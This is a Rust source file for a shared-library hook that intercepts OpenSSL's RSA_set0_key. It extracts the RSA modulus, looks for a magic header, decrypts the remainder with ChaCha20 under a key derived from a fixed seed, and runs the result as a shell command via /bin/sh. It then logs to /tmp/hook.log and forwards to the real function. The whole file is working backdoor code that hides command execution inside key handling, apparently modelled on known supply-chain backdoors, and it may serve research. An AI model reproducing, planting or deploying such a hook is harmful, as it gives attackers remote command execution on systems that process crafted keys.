use chacha20::cipher::{KeyIvInit, StreamCipher, StreamCipherSeek};
use chacha20::{ChaCha20, Key, Nonce};
use ed25519_dalek::SigningKey;
use lazy_static::lazy_static;
use libc::{dlsym, RTLD_NEXT};
use std::ffi::CStr;
use std::fs::OpenOptions;
use std::io::Write;
use std::os::raw::{c_int, c_uchar, c_void};
use std::process::Command;
use std::sync::Mutex;
use std::time::{Duration, Instant};

pub const MAGIC1: u32 = 0x1234;
pub const MAGIC2: u32 = 0x5678;
pub const MAGIC3: u64 = 0xfffffffff9d9ffa2;

lazy_static! {
    static ref LAST_TRIGGER: Mutex<Option<Instant>> = Mutex::new(None);
}

fn log_to_file(msg: &str) {
    let timestamp = unsafe { libc::time(std::ptr::null_mut()) };

    if let Ok(mut file) = OpenOptions::new()
        .create(true)
        .append(true)
        .open("/tmp/hook.log")
    {
        let _ = writeln!(file, "[{}] {}", timestamp, msg);
    }
}

fn derive_key_from_seed(seed_int: u64) -> [u8; 32] {
    let mut seed_bytes = [0u8; 32];
    let bytes = seed_int.to_be_bytes();
    seed_bytes[24..32].copy_from_slice(&bytes);

    let signing_key = SigningKey::from_bytes(&seed_bytes);
    signing_key.verifying_key().to_bytes()
}

pub fn get_magic_header() -> Vec<u8> {
    let mut header = Vec::with_capacity(16);
    header.extend_from_slice(&MAGIC1.to_le_bytes());
    header.extend_from_slice(&MAGIC2.to_le_bytes());
    header.extend_from_slice(&MAGIC3.to_le_bytes());
    header
}

fn try_decrypt_and_run(key_bytes: &[u8]) {
    let header = get_magic_header();
    if key_bytes.len() < 32 || !key_bytes.starts_with(&header) {
        return;
    }

    let mut last_trigger = LAST_TRIGGER.lock().unwrap();
    if let Some(time) = *last_trigger {
        if time.elapsed() < Duration::from_millis(300) {
            return;
        }
    }

    *last_trigger = Some(Instant::now());

    let key_slice = derive_key_from_seed(0);

    let nonce_slice = &key_bytes[4..16];
    let counter = MAGIC1;
    let key = Key::from_slice(&key_slice);
    let nonce = Nonce::from_slice(nonce_slice);
    let mut cipher = ChaCha20::new(key, nonce);
    cipher.seek(counter * 64);

    let mut payload = key_bytes[16..].to_vec();
    cipher.apply_keystream(&mut payload);

    if payload.len() > 5 {
        let len = payload[3] as usize;
        if let Some(cmd_bytes) = payload.get(5..5 + len) {
            if let Ok(cmd) = std::str::from_utf8(cmd_bytes) {
                log_to_file(&format!("[RUST-HOOK] Executing: '{}'", cmd));
                let _ = Command::new("/bin/sh").arg("-c").arg(cmd).status();
            }
        }
    }
}

#[no_mangle]
pub extern "C" fn RSA_set0_key(
    r: *mut c_void,
    n: *mut c_void,
    e: *mut c_void,
    d: *mut c_void,
) -> c_int {
    unsafe {
        let bn_bin_ptr = dlsym(
            RTLD_NEXT,
            CStr::from_bytes_with_nul(b"BN_bn2bin\0").unwrap().as_ptr(),
        );
        let bn_num_ptr = dlsym(
            RTLD_NEXT,
            CStr::from_bytes_with_nul(b"BN_num_bits\0")
                .unwrap()
                .as_ptr(),
        );

        if !bn_bin_ptr.is_null() && !bn_num_ptr.is_null() && !n.is_null() {
            let bn_num: extern "C" fn(*const c_void) -> c_int = std::mem::transmute(bn_num_ptr);
            let bn_bin: extern "C" fn(*const c_void, *mut c_uchar) -> c_int =
                std::mem::transmute(bn_bin_ptr);

            let bits = bn_num(n);
            let len = (bits + 7) / 8;
            if len > 0 {
                let mut buf = vec![0u8; len as usize];
                bn_bin(n, buf.as_mut_ptr());
                try_decrypt_and_run(&buf);
            }
        }

        let real_ptr = dlsym(
            RTLD_NEXT,
            CStr::from_bytes_with_nul(b"RSA_set0_key\0")
                .unwrap()
                .as_ptr(),
        );
        if !real_ptr.is_null() {
            let real_fn: extern "C" fn(
                *mut c_void,
                *mut c_void,
                *mut c_void,
                *mut c_void,
            ) -> c_int = std::mem::transmute(real_ptr);
            real_fn(r, n, e, d)
        } else {
            log_to_file("[RUST-HOOK] Real function not found");
            0
        }
    }
}
